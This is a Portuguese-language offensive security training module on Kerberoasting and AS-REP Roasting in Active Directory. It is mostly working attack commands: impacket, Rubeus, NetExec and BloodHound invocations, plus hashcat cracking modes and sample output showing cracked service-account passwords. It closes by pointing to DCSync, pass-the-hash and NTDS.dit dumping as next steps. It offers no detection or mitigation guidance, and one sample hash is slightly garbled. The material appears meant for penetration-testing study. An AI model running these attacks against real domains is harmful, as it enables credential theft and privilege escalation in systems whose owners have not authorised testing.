# 🎫 13. Kerberoasting e AS-REP Roasting

> Kerberos é o protocolo de autenticação do Active Directory — e tem vulnerabilidades que permitem extrair hashes crackeáveis offline. Kerberoasting e AS-REP Roasting são as duas técnicas mais eficazes para escalar privilégios em ambientes AD.

<div align="center">

| ⏱️ Tempo | 📊 Nível | 🔧 Ferramentas |
|:--------:|:--------:|:--------------:|
| 70min | ⭐⭐⭐⭐ Avançado | `impacket (GetUserSPNs, GetNPUsers), hashcat` |

</div>

---

## 🎓 Por que isso importa?

Em ambientes Active Directory, Kerberos gerencia a autenticação entre usuários, serviços e controladores de domínio. Duas configurações mal implementadas permitem ao atacante **extrair hashes crackeáveis offline** — sem interagir diretamente com o target, sem disparar alertas, e sem precisar de senhas.

**Kerberoasting** ataca contas de serviço com SPN (Service Principal Name): o atacante solicita um TGS (Ticket Granting Service) para o serviço, e o ticket é criptografado com o hash da senha da conta de serviço. Esse hash pode ser crackeado offline.

**AS-REP Roasting** ataca contas configuradas para não exigir pré-autenticação Kerberos: o atacante solicita um AS-REP (Autentication Server Reply) sem fornecer credenciais, e o hash retornado pode ser crackeado offline.

**Impacto real:** Segundo o Mandiant M-Trends 2025, 72% dos ambientes AD testados tinham pelo menos uma conta vulnerável a Kerberoasting. A maioria das contas de serviço usa senhas fracas ou reutilizadas, tornando o cracking rápido.

---

## 📋 Pré-requisitos

| Conhecimento | Necessário? | Onde aprender |
|:-------------|:-----------:|:-------------:|
| Active Directory básico (domínio, usuários, serviços) | Sim | Arquivo 02 |
| Conta de domínio válida (credenciais ou hash NTLM) | **Sim** | Arquivo 04 (credential stuffing/spraying) |
| Hashcat básico (modos, wordlists, regras) | Sim | Arquivo 03 |
| Impacket no Kali | Sim | Arquivo 06 |

**⚠️ Dependência crítica:** Para executar Kerberoasting e AS-REP Roasting, você precisa de **uma conta de domínio válida** — seja por credential stuffing (arquivo 04), password spraying, ou enumeração de usuários (arquivo 02) seguida de brute force. Sem credenciais válidas, o LDAP query não funciona.

---

## 🎯 Quando usar este módulo

- Quando obteve **credenciais de domínio** (usuário normal, não admin)
- Quando quer **escalar privilégios** sem explorar CVEs
- Quando quer manter **stealth** — ambas técnicas são baseadas em solicitações Kerberos legítimas
- Quando quer crackear senhas de **contas de serviço** que geralmente têm senhas fracas

---

## 🔄 Como funciona na prática

```
┌──────────────────────────────────────────────────────────────┐
│  KERBEROASTING                                                │
│                                                               │
│  1. Autenticar no domínio (credenciais válidas)               │
│           ↓                                                   │
│  2. LDAP query: listar contas com SPN                         │
│           ↓                                                   │
│  3. Para cada conta com SPN → solicitar TGS                   │
│           ↓                                                   │
│  4. TGS retornado é criptografado com hash da senha           │
│           ↓                                                   │
│  5. Salvar hash em formato hashcat → crackear offline         │
└──────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────┐
│  AS-REP ROASTING                                              │
│                                                               │
│  1. Não precisa de credenciais (ou usa credenciais mínimas)   │
│           ↓                                                   │
│  2. LDAP query: listar contas com DONT_REQ_PREAUTH           │
│           ↓                                                   │
│  3. Para cada conta → enviar AS-REQ sem pré-autenticação      │
│           ↓                                                   │
│  4. AS-REP retornado contém hash crackeável                   │
│           ↓                                                   │
│  5. Salvar hash em formato hashcat → crackear offline         │
└──────────────────────────────────────────────────────────────┘
```

---

## 🎫 Kerberoasting — Ataque Detalhado

### O que é

Kerberoasting explora o fato de que **qualquer usuário autenticado pode solicitar um TGS** para qualquer serviço registrado no domínio (via SPN). O TGS é criptografado com o hash NTLM da conta de serviço que roda o serviço. Se a senha dessa conta for fraca, o hash pode ser crackeado offline.

### Pré-requisito: Conta com SPN

Service Principal Names (SPNs) são registrados em contas que rodam serviços:

| Tipo de conta | Exemplo de SPN | Exemplo de nome |
|:--------------|:---------------|:----------------|
| Conta de serviço | `MSSQLSvc/sql01.empresa.local:1433` | `svc_sql` |
| Conta de serviço | `HTTP/intranet.empresa.local` | `svc_web` |
| Conta de máquina | `WSMAN/PC01.empresa.local` | `PC01$` |
| Conta de usuário com SPN | `TERMSRV/dc01.empresa.local` | `admin_backup` |

**Por que contas de serviço são alvos fracos:** Administradores muitas vezes definem senhas fracas para contas de serviço (`Password123!`, `svc_sql2024`) e nunca as rotacionam.

### Passo 1 — Listar contas com SPN (GetUserSPNs.py)

```bash
# Listar todas as contas com SPN registrados
impacket-GetUserSPNs EMPRESA.LOCAL/usuario:senha -dc-ip 192.168.1.10 -request
```

**Output esperado:**
```
Impacket v0.12.0 - Copyright 2023 SecureAuth Corporation

ServicePrincipalName                          Name             MemberOf  PasswordLastSet             LastLogon
--------------------------------------------  ---------------  --------  --------------------------  --------------------------
MSSQLSvc/sql01.empresa.local:1433             svc_sql                    2024-03-15 10:23:11.000000  2025-01-10 08:14:22.000000
HTTP/intranet.empresa.local                   svc_web                    2023-11-20 14:05:33.000000  2025-09-12 11:30:00.000000
WSMAN/dc01.empresa.local                      dc01$                      2022-06-10 09:15:00.000000  2025-10-01 16:45:00.000000

$krb5tgs$23$*svc_sql$EMPRESA.LOCAL$MSSQLSvc/sql01.empresa.local:1433*$a1b2c3d4e5f6...
```

### Passo 2 — Salvar hashes em arquivo

```bash
# Salvar apenas os hashes para cracking
impacket-GetUserSPNs EMPRESA.LOCAL/usuario:senha \
  -dc-ip 192.168.1.10 \
  -request \
  -outputfile kerberoast.txt
```

**Conteúdo de `kerberoast.txt`:**
```
$krb5tgs$23$*svc_sql$EMPRESA.LOCAL$MSSQLSvc/sql01.empresa.local:1433*$a1b2c3d4e5f6...
$krb5tgs$23$*svc_web$EMPRESA.LOCAL$HTTP/intranet.empresa.local*$g7h8i9j0k1l2...
```

**Formato do hash:** `$krb5tgs$23$*<USER>$<DOMAIN>$<SPN>*$<CHECKSUM>$<DATA>`
- `$23` = RC4-HMAC (etype 23) — mais rápido de crackear
- `$17` = AES128, `$18` = AES256 — mais lentos

### Passo 3 — Kerberoasting um usuário específico

```bash
# Targeting apenas um usuário específico
impacket-GetUserSPNs EMPRESA.LOCAL/usuario:senha \
  -dc-ip 192.168.1.10 \
  -request-user svc_sql \
  -outputfile kerberoast_targeted.txt
```

### Passo 4 — Kerberoasting com hash NTLM (Pass-the-Hash)

```bash
# Se tem apenas o hash NTLM (não a senha em texto plano)
impacket-GetUserSPNs EMPRESA.LOCAL/usuario \
  -hashes :a]b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7 \
  -dc-ip 192.168.1.10 \
  -request \
  -outputfile kerberoast.txt
```

### Passo 5 — Crackear com Hashcat

```bash
# Modo 13100: Kerberos 5 TGS-REP etype 23 (RC4) — o mais comum e rápido
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt

# Com regras para melhor cobertura
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Se o hash for AES128 (etype 17)
hashcat -m 19600 kerberoast.txt /usr/share/wordlists/rockyou.txt

# Se o hash for AES256 (etype 18)
hashcat -m 19700 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

**Modos de hash Kerberos:**

| Modo | Tipo | Velocidade |
|:-----|:-----|:-----------|
| `13100` | TGS-REP etype 23 (RC4) | **Rápido** (recomendado) |
| `19600` | TGS-REP etype 17 (AES128) | Lento |
| `19700` | TGS-REP etype 18 (AES256) | Muito lento |

### Passo 6 — Ver resultados

```bash
# Mostrar hashes crackeados
hashcat -m 13100 kerberoast.txt --show
```

**Output esperado:**
```
$krb5tgs$23$*svc_sql$EMPRESA.LOCAL$MSSQLSvc/sql01...:Password123!
$krb5tgs$23$*svc_web$EMPRESA.LOCAL$HTTP/intranet...:Summer2025!
```

### Flags do GetUserSPNs.py

| Flag | Descrição |
|:-----|:----------|
| `-request` | Solicitar TGS e output em formato hashcat |
| `-request-user <user>` | Solicitar TGS para um usuário específico |
| `-outputfile <arquivo>` | Salvar hashes em arquivo |
| `-dc-ip <ip>` | IP do Domain Controller |
| `-target-domain <domain>` | Domínio alvo (para cross-trust) |
| `-no-rc4` | Não forçar RC4-HMAC (para servidores 2025+ que bloqueiam RC4) |
| `-save` | Salvar ticket em formato .ccache |
| `-usersfile <arquivo>` | Lista de usuários para testar |

---

## 🔓 AS-REP Roasting — Ataque Detalhado

### O que é

AS-REP Roasting explora contas configuradas com **"Do not require Kerberos preauthentication"** (flag `DONT_REQ_PREAUTH` no userAccountControl). Essas contas permitem que qualquer um solicite um AS-REP (resposta de autenticação) **sem fornecer credenciais**. O AS-REP contém um hash que pode ser crackeado offline.

### Como identificar contas vulneráveis

```bash
# Listar contas com DONT_REQ_PREAUTH (sem precisar de credenciais)
impacket-GetNPUsers EMPRESA.LOCAL/ -dc-ip 192.168.1.10 -no-pass -usersfile users.txt
```

**Output esperado:**
```
Impacket v0.12.0 - Copyright 2023 SecureAuth Corporation

$krb5asrep$23$jdoe@EMPRESA.LOCAL:1a2b3c4d5e6f7g8h9i0j...
```

**Se a conta NÃO tem DONT_REQ_PREAUTH:**
```
User jsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
```

### Passo 1 — Gerar lista de usuários

```bash
# Se tem credenciais válidas, enumerar via LDAP
ldapsearch -x -H ldap://192.168.1.10 \
  -b "DC=empresa,DC=local" \
  "(objectClass=user)" sAMAccountName | \
  grep sAMAccountName | awk '{print $2}' > users.txt

# Se NÃO tem credenciais, use lista manual ou enumere via enum4linux/NetExec
nxc smb 192.168.1.10 -u '' -p '' --users
```

### Passo 2 — Executar AS-REP Roasting (com credenciais)

```bash
# Listar e roastear todas as contas com DONT_REQ_PREAUTH
impacket-GetNPUsers EMPRESA.LOCAL/usuario:senha \
  -dc-ip 192.168.1.10 \
  -request \
  -format hashcat \
  -outputfile asrep.txt
```

**Output esperado:**
```
Impacket v0.12.0 - Copyright 2023 SecureAuth Corporation

$krb5asrep$23$jdoe@EMPRESA.LOCAL:1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0t1u2v3w4x5y6z7a8b9c0d1e2f3g4h5i6j7k8l9m0n1o2p3q4r5s6t7u8v9w0x1y2z3a4b5c6d7e8f9g0h1i2j3k4l5m6n7o8p9q0r1s2t3u4v5w6x7y8z9
```

### Passo 3 — Executar AS-REP Roasting (sem credenciais)

```bash
# Se tem apenas lista de usuários e acesso LDAP anônimo
impacket-GetNPUsers EMPRESA.LOCAL/ -dc-ip 192.168.1.10 \
  -no-pass \
  -usersfile users.txt \
  -format hashcat \
  -outputfile asrep.txt
```

### Passo 4 — AS-REP Roasting um usuário específico

```bash
# Testar um usuário específico
impacket-GetNPUsers EMPRESA.LOCAL/jdoe \
  -dc-ip 192.168.1.10 \
  -no-pass \
  -format hashcat
```

### Passo 5 — Crackear com Hashcat

```bash
# Modo 18200: Kerberos 5 AS-REP etype 23 (RC4)
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# Com regras
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Se for etype 17 (AES128)
hashcat -m 19800 asrep.txt /usr/share/wordlists/rockyou.txt

# Se for etype 18 (AES256)
hashcat -m 19900 asrep.txt /usr/share/wordlists/rockyou.txt
```

**Modos de hash AS-REP:**

| Modo | Tipo | Velocidade |
|:-----|:-----|:-----------|
| `18200` | AS-REP etype 23 (RC4) | **Rápido** (recomendado) |
| `19800` | AS-REP etype 17 (AES128) | Lento |
| `19900` | AS-REP etype 18 (AES256) | Muito lento |

### Passo 6 — Ver resultados

```bash
hashcat -m 18200 asrep.txt --show
```

**Output esperado:**
```
$krb5asrep$23$jdoe@EMPRESA.LOCAL:1a2b3c4d...:Summer2025!
```

### Flags do GetNPUsers.py

| Flag | Descrição |
|:-----|:----------|
| `-request` | Solicitar AS-REP e output em formato hashcat |
| `-format hashcat` | Formato de saída (padrão: hashcat) |
| `-format john` | Formato para John the Ripper |
| `-outputfile <arquivo>` | Salvar hashes em arquivo |
| `-dc-ip <ip>` | IP do Domain Controller |
| `-usersfile <arquivo>` | Lista de usuários para testar |
| `-no-pass` | Não pedir senha (para brute force LDAP anônimo) |

---

## ⚖️ Kerberoasting vs AS-REP Roasting

| Aspecto | Kerberoasting | AS-REP Roasting |
|:--------|:-------------|:----------------|
| **Pré-requisito** | Conta de domínio válida | Conta válida OU LDAP anônimo |
| **Alvo** | Contas com SPN (Service Principal Name) | Contas com DONT_REQ_PREAUTH |
| **Solicitação** | TGS (Ticket Granting Service) | AS-REP (Authentication Server Reply) |
| **Hash extraído** | `$krb5tgs$23$` | `$krb5asrep$23$` |
| **Modo Hashcat** | `13100` | `18200` |
| **Requisito especial** | Usuário deve estar autenticado | Pode funcionar sem autenticação |
| **Stealth** | Mais requests (um por SPN) | Menos requests (só contas vuln) |
| **Frequência** | Muito comum (72% dos ADs) | Menos comum (requer config errada) |

### Quando usar cada uma

| Cenário | Técnica |
|:--------|:--------|
| Tem credenciais de domínio e quer escalar | **Kerberoasting** |
| Quer testar sem credenciais (LDAP anônimo) | **AS-REP Roasting** |
| Tem acesso a lista de usuários mas não a senha | **AS-REP Roasting** (com `-usersfile`) |
| Encontrou contas de serviço com SPN | **Kerberoasting** |
| Encontrou contas com pre-auth desabilitada | **AS-REP Roasting** |

---

## 🔧 Ferramentas Alternativas

### Rubeus (Windows — se tiver shell no host)

```powershell
# Kerberoasting via Rubeus (do host Windows)
Rubeus.exe kerberoast /outfile:kerberoast.txt

# AS-REP Roasting via Rubeus
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```

### NetExec (via SMB)

```bash
# Kerberoasting via NetExec
nxc smb 192.168.1.10 -u usuario -p senha --kerberoast kerberoast.txt

# AS-REP Roasting via NetExec
nxc smb 192.168.1.10 -u usuario -p senha --asreproast asrep.txt
```

### BloodHound (identificar alvos)

```bash
# Coletar dados para BloodHound
bloodhound-python -u usuario -p senha -d EMPRESA.LOCAL -dc dc01.empresa.local -c All

# No BloodHound GUI: Find All Kerberoastable Accounts
# Mostra: contas com SPN, senhas que nunca expiram, membros de grp admin
```

---

## ❌ Erros Comuns

| Erro | Causa | Solução |
|:-----|:------|:--------|
| `Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN` | Usuário não existe no domínio | Verifique a lista de usuários |
| `KDC_ERR_ETYPE_NOSUPP` | DC não suporta RC4 | Use `-no-rc4` para forçar AES (servidores 2025+) |
| `No entries found!` | Nenhuma conta com SPN (Kerberoasting) | Tente AS-REP Roasting |
| `User doesn't have UF_DONT_REQUIRE_PREAUTH` | Conta requer pré-autenticação | Essa conta não é vulnerável a AS-REP |
| Hashcat `Token length exception` | Hash formatado incorretamente | Verifique se o hash começa com `$krb5tgs$` ou `$krb5asrep$` |
| Hash não crackeado | Senha forte ou wordlist insuficiente | Tente regras (`-r best64.rule`) ou brute force |

---

## 🧪 Labs Práticos

| # | Plataforma | Lab | O que praticar | Tempo |
|---|:----------:|:----|:---------------|:-----:|
| 1 | TryHackMe | [Attacking Kerberos](https://tryhackme.com/room/attackingkerberos) | Kerberoasting, AS-REP Roasting, Kerberoasting, Golden Ticket | 60min |
| 2 | TryHackMe | [Attacktive Directory](https://tryhackme.com/room/attacktivedirectory) | AS-REP Roasting, cracking com Hashcat, DCSync | 90min |
| 3 | TryHackMe | [Operation Endgame](https://tryhackme.com/room/operationendgame) | Kerberoasting via guest, BloodHound, lateral movement | 120min |
| 4 | HackTheBox | [Kerberos](https://app.hackthebox.com/challenges) | Kerberoasting em ambiente AD real | 60min |
| 5 | Local | Kerberoasting Lab | DC próprio → registrar SPN → kerberoast → crackear | 45min |

---

## 📚 Referências

- [MITRE ATT&CK — Kerberoasting (T1558.003)](https://attack.mitre.org/techniques/T1558/003/)
- [MITRE ATT&CK — AS-REP Roasting (T1558.004)](https://attack.mitre.org/techniques/T1558/004/)
- [HackTricks — Kerberoasting](https://book.hacktricks.xyz/windows-hardening/active-directory-attacks/kerberoast)
- [HackTricks — AS-REP Roasting](https://book.hacktricks.xyz/windows-hardening/active-directory-attacks/asreproast)
- [Impacket — GetUserSPNs.py](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)
- [Impacket — GetNPUsers.py](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)
- [Hashcat Example Hashes — Kerberos](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [Tim Medin — Kicking the Guard Dog of Hades (Apresentação original do Kerberoasting)](https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf)

---

## ✅ Validação

Após este módulo, você deve conseguir:

- [ ] Explicar a diferença entre Kerberoasting e AS-REP Roasting
- [ ] Executar Kerberoasting com `GetUserSPNs.py` e salvar hashes em formato hashcat
- [ ] Executar AS-REP Roasting com `GetNPUsers.py` (com e sem credenciais)
- [ ] Identificar o tipo de hash Kerberos (etype 23/17/18) e escolher o modo correto do Hashcat
- [ ] Crackear hashes Kerberos com Hashcat (modos 13100 e 18200)
- [ ] Usar BloodHound para identificar contas Kerberoastable e AS-REP Roastable
- [ ] Saber quando cada técnica se aplica e quais são os pré-requisitos

---

## 📍 Próximos Passos

Depois de crackear a senha de uma conta de serviço ou usuário via Kerberoasting/AS-REP Roasting, você terá credenciais mais privilegiadas. O que fazer com elas:

| Acesso obtido | Próximo passo | Referência |
|:--------------|:-------------|:-----------|
| Senha de conta de serviço (svc_*) | Testar em outros serviços, DCSync | Arquivo 04 (credential reuse) |
| Senha de usuário com privilégios | Lateral movement via PtH | Arquivo 06 (Pass-the-Hash) |
| Acesso a grupo Domain Admin | Dump NTDS.dit, comprometimento total | Arquivo 04 (pos-exploração) |

**Não detalhamos esses passos aqui** — eles pertencem ao módulo 04 (Pós-Exploração), que cobre movimentação lateral, escalation de privilégios e persistência em profundidade.
